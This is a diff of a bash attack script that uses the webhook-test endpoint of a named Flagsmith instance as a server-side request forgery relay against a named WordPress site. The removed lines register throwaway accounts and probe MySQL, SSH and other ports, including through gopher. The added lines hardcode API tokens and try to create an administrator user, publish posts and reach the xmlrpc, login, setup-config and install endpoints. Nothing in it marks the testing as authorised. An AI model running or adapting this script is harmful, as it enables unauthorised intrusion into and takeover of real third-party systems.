@@ -1,73 +1,52 @@
 #!/bin/bash
 UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
-
-# Register fresh account
-ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
-  -H "Content-Type: application/json" -H "User-Agent: $UA" \
-  -d "{\"email\":\"kw-v23-$(date +%s)@proton.me\",\"password\":\"Hy7Nm3Qw9Rx!\",\"first_name\":\"T\",\"last_name\":\"S\"}" --max-time 15)
-KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
-echo "Key: $KEY"
-
-if [ -z "$KEY" ]; then
-  # Use latest known working account
-  KEY="0cb53dd00f936c2de9e7ba6061bdf7f93e596d2b"
-  EKEY="Ldqx3Z27VxYrTFXgWYiZhb"
-  echo "Fallback"
-else
-  OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
-    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
-    -d '{"name":"v23"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
-  PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
-    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
-    -d "{\"name\":\"p\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
-  EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
-    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
-    -d "{\"name\":\"e\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
-  echo "Env: $EKEY"
-fi
+KEY="e43b0d44b4b43efb28b21fef7bee5977203f0276"
+EKEY="4kKuh8VekuYPrtpsJFg5mg"
 
 SSRF() {
   curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
     -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
-    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TO"
+    -d "{\"url\":\"$1\"}" --max-time 30 2>/dev/null || echo "TO"
 }
 
-# === TEST 1: MySQL port via HTTP (leak version) ===
-echo "=== MYSQL VIA HTTP ==="
-SSRF "http://koinp2p.com:3306/"
+echo "IP: $(curl -s https://ifconfig.me)"
+
+# Test 1: REST API write — create user (POST)
+echo "=== CREATE USER VIA REST ==="
+SSRF "http://koinp2p.com/wp-json/wp/v2/users?username=rce_test&email=rce@test.com&password=RceTest2026!&roles=administrator"
 echo ""
 
-# === TEST 2: WP REST API (was 200 from agent scan!) ===
-echo "=== WP REST API ==="
-SSRF "http://koinp2p.com/wp-json/"
+# Test 2: REST API write — create post
+echo "=== CREATE POST VIA REST ==="
+SSRF "http://koinp2p.com/wp-json/wp/v2/posts?title=test&content=test&status=publish"
 echo ""
 
-# === TEST 3: WP REST API users (might be public from internal) ===
-echo "=== WP REST USERS ==="
-SSRF "http://koinp2p.com/wp-json/wp/v2/users"
+# Test 3: Check if WP REST API allows application password creation
+echo "=== APP PASSWORDS ==="
+SSRF "http://koinp2p.com/wp-json/wp/v2/users/me/application-passwords"
 echo ""
 
-# === TEST 4: WP REST API posts ===
-echo "=== WP REST POSTS ==="
-SSRF "http://koinp2p.com/wp-json/wp/v2/posts"
+# Test 4: admin-ajax with wp_ajax_nopriv actions via internal HTTP (not HTTPS!)
+echo "=== INTERNAL ADMIN-AJAX ==="
+SSRF "http://koinp2p.com/wp-admin/admin-ajax.php?action=heartbeat"
 echo ""
 
-# === TEST 5: Port 9090 (unknown service) ===
-echo "=== PORT 9090 ==="
-SSRF "http://koinp2p.com:9090/"
+# Test 5: WP XMLRPC via internal (might not be blocked internally)
+echo "=== INTERNAL XMLRPC ==="
+SSRF "http://koinp2p.com/xmlrpc.php"
 echo ""
 
-# === TEST 6: SSH port (banner) ===
-echo "=== SSH PORT ==="
-SSRF "http://koinp2p.com:22/"
+# Test 6: WP login via internal HTTP (was 403 via HTTPS, might differ via HTTP)
+echo "=== INTERNAL WP-LOGIN ==="
+SSRF "http://koinp2p.com/wp-login.php"
 echo ""
 
-# === TEST 7: Gopher to MySQL (inject MySQL auth) ===
-echo "=== GOPHER MYSQL ==="
-SSRF "gopher://koinp2p.com:3306/_"
+# Test 7: setup-config.php via internal (CVE-2026-119977 related)
+echo "=== INTERNAL SETUP-CONFIG ==="
+SSRF "http://koinp2p.com/wp-admin/setup-config.php"
 echo ""
 
-# === TEST 8: Use HTTP via internal hostname ===
-echo "=== INTERNAL HTTP ==="
-SSRF "http://koinp2p.com/wp-content/debug.log"
+# Test 8: install.php via internal
+echo "=== INTERNAL INSTALL ==="
+SSRF "http://koinp2p.com/wp-admin/install.php"
 echo ""
